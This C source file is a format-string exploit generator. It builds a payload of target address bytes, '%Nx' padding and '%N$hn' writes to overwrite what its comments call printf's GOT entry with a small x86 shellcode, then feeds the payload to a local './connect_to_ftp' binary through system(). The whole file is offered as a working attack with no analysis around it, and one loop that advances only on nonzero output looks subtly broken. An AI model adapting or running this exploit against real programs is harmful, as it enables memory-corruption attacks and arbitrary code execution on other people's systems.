#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char* extract_addresses(unsigned int mem_addr, int num_addresses, char* buff, int size_buff, int num_so_far);
char* process_shellcode(char *psz, char* buff, int size_buff, int num_so_far, int offset_param);
void generate_payload(char *payload, unsigned int mem_addr, unsigned int offset_param);

int main() {
    char payload[4096]; // Buffer to hold the generated payload
    unsigned int mem_addr = 0x0806d3b0; // Address to overwrite (GOT entry of printf, may vary)
    unsigned int offset_param = 272; // Offset of the parameter that contains the start of our string

    // Generate the payload
    generate_payload(payload, mem_addr, offset_param);

    // Construct the command and execute it
    char *fmt_command = "./connect_to_ftp localhost $'%s' 1\n" ;
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), fmt_command , payload);
    system(cmd);

    return 0;
}

char* extract_addresses(unsigned int mem_addr, int num_addresses, char* buff, int size_buff, int num_so_far) {
    char tmp[4096] = "";
    int a[4];

    for (int i = 0; i < num_addresses; i++) {
        a[0] = mem_addr & 0xff;
        a[1] = (mem_addr & 0xff00) >> 8;
        a[2] = (mem_addr & 0xff0000) >> 16;
        a[3] = mem_addr >> 24;

        // Format and concatenate each address byte into the payload buffer
        sprintf(tmp, "\\x%.02x\\x%.02x\\x%.02x\\x%.02x", a[0], a[1], a[2], a[3]);

        if (strlcat(buff, tmp, size_buff) >= size_buff) {
            printf("Error: Buffer too small for address concatenation\n");
            exit(1);
        }

        mem_addr += 2;
        num_so_far += 4;
    }
    return buff;
}

char* process_shellcode(char *psz, char* buff, int size_buff, int num_so_far, int offset_param) {
    int num_to_print, num_so_far_mod;
    unsigned short s;
    char tmp[4096] = "";

    while ((*psz != 0) && (*(psz + 1) != 0)) {
        s = *(unsigned short *)psz;
        num_so_far_mod = num_so_far & 0xffff;
        num_to_print = 0;

        if (num_so_far_mod < s) {
            num_to_print = s - num_so_far_mod;
        } else if (num_so_far_mod > s) {
            num_to_print = 0x10000 - (num_so_far_mod - s);
        }

        num_so_far += num_to_print;

        if (num_to_print > 0) {
            // Format and concatenate the format specifier into the payload buffer
            sprintf(tmp, "%%%dx", num_to_print);

            if (strlcat(buff, tmp, size_buff) >= size_buff) {
                printf("Error: Buffer too small for format specifier concatenation\n");
                exit(1);
            }

            // Format and concatenate the parameter index into the payload buffer
            sprintf(tmp, "%%%d$hn", offset_param);

            if (strlcat(buff, tmp, size_buff) >= size_buff) {
                printf("Error: Buffer too small for parameter index concatenation\n");
                exit(1);
            }

            psz += 2;
            offset_param++;
        }
    }
    return buff;
}

void generate_payload(char *payload, unsigned int mem_addr, unsigned int offset_param) {
    char *shellcode = "\xb4\xd3\x06\x08\x31\xc0\x31\xc9\x31\xd2\xb0\x01\x31\xdb\xb3\x02\xcd\x80";
    char buff[4096] = "";
    unsigned int size_buff = 4096;
    int num_so_far = 6;
    char *psz;
    int num_addresses;

    // Calculate the number of addresses required for the payload
    num_addresses = (strlen(shellcode) / 2) + (strlen(shellcode) % 2);
    extract_addresses(mem_addr, num_addresses, buff, size_buff, num_so_far);

    if (strlcat(buff, shellcode, size_buff) >= size_buff) {
        printf("Error: Buffer too small for format specifier concatenation\n");
        exit(1);
    }

    psz = shellcode;
    process_shellcode(psz, buff, size_buff, num_so_far, offset_param);

    if (strlcat(buff, psz, size_buff) >= size_buff) {
        printf("Error: Buffer too small for format specifier concatenation\n");
        exit(1);
    }

    // Copy the generated payload into the provided payload buffer
    strcpy(payload, buff);
}